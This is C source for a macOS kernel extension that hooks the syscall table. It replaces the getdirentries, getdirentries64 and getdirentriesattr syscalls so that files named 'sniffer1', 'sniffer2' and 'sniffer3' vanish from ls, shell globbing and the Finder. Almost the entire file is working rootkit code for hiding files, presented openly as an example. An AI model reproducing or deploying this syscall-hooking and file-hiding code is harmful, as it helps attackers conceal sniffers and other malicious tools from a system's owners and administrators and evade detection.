/* This example hides tree different files: 
 It hides:
   - 'sniffer1' from getdirentries()
   - 'sniffer2' from getdirentries64()
   - 'sniffer3' from getdirentriesattr()

Use echo *, ls and the Finder to see the differance in a directory containing all three files 

*/

#define PROC_DEF_ENABLED
#define SYSCTL_DEF_ENABLED

#include <sys/proc.h>
#include <sys/sysctl.h>
#include <sys/systm.h>
#include <sys/attr.h>
#include <sys/dirent.h>

#include <mach/mach_types.h>
#include <libkern/libkern.h>

struct getdirentries_args {
  char fd_l_[PADL_(int)]; int fd; char fd_r_[PADR_(int)];
  char buf_l_[PADL_(user_addr_t)]; user_addr_t buf; char buf_r_[PADR_(user_addr_t)];
  char count_l_[PADL_(u_int)]; u_int count; char count_r_[PADR_(u_int)];
  char basep_l_[PADL_(user_addr_t)]; user_addr_t basep; char basep_r_[PADR_(user_addr_t)];
};

struct getdirentries64_args {
  char fd_l_[PADL_(int)]; int fd; char fd_r_[PADR_(int)];
  char buf_l_[PADL_(user_addr_t)]; user_addr_t buf; char buf_r_[PADR_(user_addr_t)];
  char bufsize_l_[PADL_(user_size_t)]; user_size_t bufsize; char bufsize_r_[PADR_(user_size_t)];
  char position_l_[PADL_(user_addr_t)]; user_addr_t position; char position_r_[PADR_(user_addr_t)];
};

struct getdirentriesattr_args {
  char fd_l_[PADL_(int)]; int fd; char fd_r_[PADR_(int)];
  char alist_l_[PADL_(user_addr_t)]; user_addr_t alist; char alist_r_[PADR_(user_addr_t)];
  char buffer_l_[PADL_(user_addr_t)]; user_addr_t buffer; char buffer_r_[PADR_(user_addr_t)];
  char buffersize_l_[PADL_(user_size_t)]; user_size_t buffersize; char buffersize_r_[PADR_(user_size_t)];
  char count_l_[PADL_(user_addr_t)]; user_addr_t count; char count_r_[PADR_(user_addr_t)];
  char basep_l_[PADL_(user_addr_t)]; user_addr_t basep; char basep_r_[PADR_(user_addr_t)];
  char newstate_l_[PADL_(user_addr_t)]; user_addr_t newstate; char newstate_r_[PADR_(user_addr_t)];
  char options_l_[PADL_(user_ulong_t)]; user_ulong_t options; char options_r_[PADR_(user_ulong_t)];
};

/* Pointers to orig syscall */
int (*org_getdirentriesattr) (proc_t *p, struct getdirentriesattr_args *uap, register_t *retval);
int (*org_getdirentries) (proc_t *p, struct getdirentries_args *uap, register_t *retval);
int (*org_getdirentries64) (proc_t *p, struct getdirentries64_args *uap, user_ssize_t *retval);


int new_getdirentries(proc_t *p, struct getdirentries_args *uap, register_t *retval)
{
  int ret; 
  u_int bcount = 0;
  u_int btot = 0;
  size_t buffersize = 0;
  struct dirent *dirp;
  void *mem = NULL;
  int updated = 0;
  
  /* Call the real syscall, return value gets stored in ret */
  ret = org_getdirentries(p,uap,retval); 

  /* The number of bytes to process*/
  btot = buffersize = bcount = *retval;

  if(bcount > 0)
    {
      /* Allocate memory to hold copy */
      MALLOC(mem,void *,bcount,M_TEMP,M_WAITOK);

      if(mem == NULL)
	return(ret); /* eek */
        
      /* Copy data from userspace to kernelspace */
      copyin(uap->buf, mem, bcount); 
        
      /* Point dirp at first directory structure */
      dirp = mem;
        
      while(bcount > 0 && dirp->d_reclen > 0)
	{
	  if(dirp->d_reclen > 7)
	  if(strncmp(dirp->d_name,"sniffer1",8) == 0)
	    {
	      char *next = (char *) dirp + dirp->d_reclen;
	      
	      /* How far into the buffer the next entry is */
	      u_int offset = (char *) next - (char *) mem;

	      /* We have one entry less to process  */
	      bcount -= dirp->d_reclen;
	      btot -= dirp->d_reclen;

	      /* Overwrite this entry with the rest of the buffer */
	      bcopy(next,dirp,buffersize - offset);
	  
	      /* Mark data as updated */
	      updated = 1;
    
	      /* dirp now points to the next entry, lets continue processing */
	      continue;
	    }
	  
	  /* Caluclate the number of bytes left to process */
	  bcount -= dirp->d_reclen;
	  /* Get the next pointer */
	  dirp = (struct dirent *) ((char *) dirp + dirp->d_reclen);
	}
      
      /* If we have changed anything we copy data from kernelspace to userspace */
      if(updated == 1)
	{
	  /* Copy out the updated buffer */
	  copyout(mem,uap->buf,btot);
	  
	  /* Update size */
	  *retval = btot; 
	}
      
      /* Deallocate memory buffer */
      FREE(mem,M_TEMP);
    }
  
  /* Return result */
  return(ret);
}

int new_getdirentries64(proc_t *p, struct getdirentries64_args *uap, user_ssize_t *retval)
{
  int ret; 
  u_int bcount = 0;
  u_int btot = 0;
  size_t buffersize = 0;
  struct direntry *dirp;
  void *mem = NULL;
  int updated = 0;
  
  /* Call the real syscall, return value gets stored in ret */
  ret = org_getdirentries64(p,uap,retval); 

  /* The number of bytes to process*/
  btot = buffersize = bcount = *retval;

  if(bcount > 0)
    {
      /* Allocate memory to hold copy */
      MALLOC(mem,void *,bcount,M_TEMP,M_WAITOK);

      if(mem == NULL)
	return(ret); /* eek */
        
      /* Copy data from userspace to kernelspace */
      copyin(uap->buf, mem, bcount); 
        
      /* Point dirp at first directory structure */
      dirp = mem;

      while(bcount > 0 && dirp->d_reclen > 0)
	{
	  if(dirp->d_reclen > 7)
	  if(strncmp(dirp->d_name,"sniffer2",8) == 0)
	    {
	      char *next = (char *) dirp + dirp->d_reclen;
	      
	      /* How far into the buffer the next entry is */
	      u_int offset = (char *) next - (char *) mem ;

	      /* We have one entry less to process  */
	      bcount -= dirp->d_reclen;
	      btot -= dirp->d_reclen;

	      /* Overwrite this entry with the rest of the buffer */
	      bcopy(next,dirp,buffersize - offset);
	  
	      /* Mark data as updated */
	      updated = 1;
    
	      /* dirp now points to the next entry, lets continue processing */
	      continue;
	    }
	  
	  /* Caluclate the number of bytes left to process */
	  bcount -= dirp->d_reclen;
	  /* Get the next pointer */
	  dirp = (struct direntry *) ((char *) dirp + dirp->d_reclen);
	}
      
      /* If we have changed anything we copy data from kernelspace to userspace */
      if(updated == 1)
	{
	  /* Copy out the updated buffer */
	  copyout(mem,uap->buf,btot);
	  
	  /* Update size */
	  *retval = btot; 
	}
      
      /* Deallocate memory buffer */
      FREE(mem,M_TEMP);
    }
  
  /* Return result */
  return(ret);
}

struct FInfoAttrBuf {
  unsigned long   length;
  attrreference_t name;
  fsobj_type_t    objType;
  char            finderInfo[32];
};

int new_getdirentriesattr(proc_t *p, struct getdirentriesattr_args *uap, int *retval)
{
  struct FInfoAttrBuf *dirp;
  int ret; /* Used by the CALLORG macro */
  int removed = 0;
  u_long count = 0;
  size_t buffersize = 0;
  void *mem = NULL;
        
  /* Call the real syscall, return value gets stored in ret */
  ret = org_getdirentriesattr(p,uap,retval); 

  /* Copy in the number of structs in to counter*/
  copyin(uap->count,&count,sizeof(u_long));

  /* Store size of buffer */
  buffersize = uap->buffersize;

  if(count > 0 && buffersize > 0)
    {
      /* Allocate memory to hold copy */
      MALLOC(mem,void *,buffersize,M_TEMP,M_WAITOK);

      if(mem == NULL)
	  return(ret);
        
      /* Copy data from userspace to kernelspace */
      copyin(uap->buffer, mem, buffersize); 
        
      /* point to first struct */
      dirp = (struct FInfoAttrBuf *) mem;     
      while(count > 0)
	{ 
	  /* current filename */
	  char *name = ((char *) &dirp->name + dirp->name.attr_dataoffset);
                        
	  /* if we have a match we remove that entry */
	  if(dirp->name.attr_length > 7)
	  if(strncmp(name,"sniffer3",8) == 0)
	    {
	      /* The next dirp-entry */ 
	      char *next = ((char *) dirp + dirp->length);
                                        
	      /* How far into the buffer the next entry is */
	      u_int offset = (char *) next - (char *) mem;
                                        
	      printf("mem == %X\n",mem);
	      printf("next == %X\n",next);

	      /* Overwrite this entry with the rest of the buffer */
	      printf("bcopy(%X,%X,%d) - buffersize == %d, offset == %d\n",next,dirp,buffersize - offset,buffersize,offset);
	      bcopy(next,dirp,buffersize - offset);
                                   
	      /* count how many we have removed */
	      removed++;
                                   
	      /* We have one entry less to process now */
	      count--;

	      if(count == 0)
		break;
                                   
	      /* dirp now points to the next entry, lets continue processing */
	      continue;

	    }
        
	  /* Walk to the next struct */
	  dirp = (struct FInfoAttrBuf *) ((char *) dirp + dirp->length);  
                
	  /* Decrement number of entries remaining to process */
	  count--;
	}

      /* If we changed something and must copy the result to userspace */
      if(removed > 0)
	{
	  /* Copy in the number of structs in to counter*/
	  copyin(uap->count,&count,sizeof(u_long));
                                
	  /* Discount the number of removed entries */
	  count -= removed;
                                
	  /* Copy the updated value back to userspace */
	  copyout(&count,uap->count,sizeof(u_long));
                
	  /* We have messed with mem too ... */
	  copyout(mem,uap->buffer, buffersize); 
                                
	  /* Now we are ready to return to userland ... :) */
	}
                        
      /* Deallocate memory buffer */
      FREE(mem,M_TEMP);
    }

  return(ret);
}

kern_return_t hidefile_start (kmod_info_t * ki, void * d) {
 
  sysent = locate_sysent();
  if (sysent == NULL) {
    return KERN_FAILURE;
  }
   
  /* Store original address of syscall */ 
  org_getdirentries = (void *) sysent[SYS_getdirentries].sy_call; 
  org_getdirentries64 = (void *) sysent[SYS_getdirentries64].sy_call; 
  org_getdirentriesattr = (void *) sysent[SYS_getdirentriesattr].sy_call; 
  
  /* Replace syscall in syscall table */
  sysent[SYS_getdirentries].sy_call = (void *) new_getdirentries;   
  sysent[SYS_getdirentries64].sy_call = (void *) new_getdirentries64;
  sysent[SYS_getdirentriesattr].sy_call = (void *) new_getdirentriesattr;
  return KERN_SUCCESS;
}

kern_return_t hidefile_stop (kmod_info_t * ki, void * d) {
  
  sysent[SYS_getdirentries].sy_call = (void *) org_getdirentries;
  sysent[SYS_getdirentries64].sy_call = (void *) org_getdirentries64;
  sysent[SYS_getdirentriesattr].sy_call = (void *) org_getdirentriesattr;

  return KERN_SUCCESS;
}
